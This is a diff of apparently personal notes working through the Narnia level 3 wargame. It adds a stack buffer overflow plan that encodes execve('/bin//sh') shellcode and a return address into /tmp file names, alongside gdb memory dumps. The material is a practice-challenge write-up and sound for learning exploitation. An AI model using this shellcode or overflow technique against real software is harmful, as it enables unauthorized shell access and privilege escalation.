@@ -89,6 +89,12 @@ Starting program: /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x
 0xffffd690:     0x5350e389      0xc289e189      0x80cd0bb0      0xffffd660  ifd, ofd, ebp, eip
 
 now i will create an ofile and ifile to match overflowed/input byte strings so that the checks are passed.
+file creation must occur in /tmp directory.
+
+ifile: "/tmp/" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x90"*2  
+ofile: "/tmp/" + "\x90"*23 + "\x60\xd6\xff\xff"
+ifile contains shellcode
+ofile contains return address
 
 ----------------------------------------------------------------------------------------------------------------------------------
 2) examining the second potential overflow @ write(ofd, buf, sizeof(buf)-1);
@@ -134,7 +140,7 @@ ofd and buf AFTER write function:
 0xffffd6a0:     0x7665642f      0x6c756e2f      0x0000006c      0x00000000
 0xffffd6b0:     0x00000004      0x00000003      0x00000000      0xf7e2a286
 
-no change... to ofile...
+no change... to ofile..
 
 but what if you changed what the output file was? it's possible.
 first let's try to exit the program properly with the return address altered.
